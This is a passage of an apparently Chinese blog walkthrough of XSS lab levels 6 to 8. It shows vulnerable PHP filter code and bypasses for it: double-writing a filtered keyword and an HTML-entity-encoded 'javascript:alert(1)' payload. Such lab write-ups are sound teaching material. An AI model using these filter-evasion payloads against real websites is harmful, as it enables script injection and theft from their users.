alt=\"\"></p>\n<p>这样就成功绕过了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/15.png\" alt=\"\"></p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level7.php?keyword=move up!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;form action=level6.php method=GET></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str6</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input type=submit name=submit value=搜索 /></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level6.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>2</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mo>&lt;</mo><mi>s</mi><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mo>&lt;</mo><mi>s</mi><mi>c</mi><msub><mi>r</mi><mi>i</mi></msub><mi>p</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">scr</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">pt</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">sc</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">pt</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>3</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>o</mi><mi>n</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><msub><mi>o</mi><mi>n</mi></msub><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str2);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>4</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>r</mi><mi>c</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><msub><mi>r</mi><mi>c</mi></msub><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">src</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str3);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>5</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>d</mi><msub><mi>a</mi><mi>t</mi></msub><mi>a</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">d</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2806em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str4);</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>6</mn><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>h</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">&quot;</mi><mi>h</mi><msub><mi>r</mi><mi>e</mi></msub><mi>f</mi><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">pl</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">ce</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">re</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord\">&quot;</span><span class=\"mpunct\">,</span></span></span></span>str5);</p>\n<p>过滤了更多标签</p>\n<h4 id=\"第七关\"><a class=\"markdownIt-Anchor\" href=\"#第七关\">#</a> <span class=\"label\">第七关</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/16.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/17.png\" alt=\"\"></p>\n<p>把 href 过滤为空了，可以写两遍双写绕过</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/18.png\" alt=\"\"></p>\n<h4 id=\"第八关\"><a class=\"markdownIt-Anchor\" href=\"#第八关\">#</a> <span class=\"label\">第八关</span></h4>\n<p>把输入内容到了 input 标签里和 a 标签里</p>\n<p>script 被替换双引号被转义</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/19.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/20.png\" alt=\"\"></p>\n<p>javascript 也被替换了</p>\n<p>把 javascript:alert (1); 编码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/21.png\" alt=\"\"></p>\n<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;</code>  绕过替换检测到 herf 里面会被解码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/22.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/24.png\" alt=\"\"></p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 